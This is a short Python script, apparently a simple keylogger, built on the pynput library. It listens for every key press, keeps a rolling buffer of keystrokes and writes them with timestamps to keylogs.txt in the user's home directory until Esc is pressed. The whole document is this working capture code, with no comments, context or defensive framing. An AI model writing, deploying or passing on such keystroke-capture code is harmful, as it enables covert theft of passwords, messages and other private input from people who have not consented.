from pynput import keyboard
from pathlib import Path
import logging

log_dir = str(Path.home()) + "\\"
logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

wordList = ['']

def on_press(key):
    if key != keyboard.Key.backspace:
        wordList.append(str(key))
    
    if key == keyboard.Key.backspace and len(wordList) >= 1:
        wordList.pop()
    
    if len(wordList) == 20:
        logging.info(wordList.pop(0))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
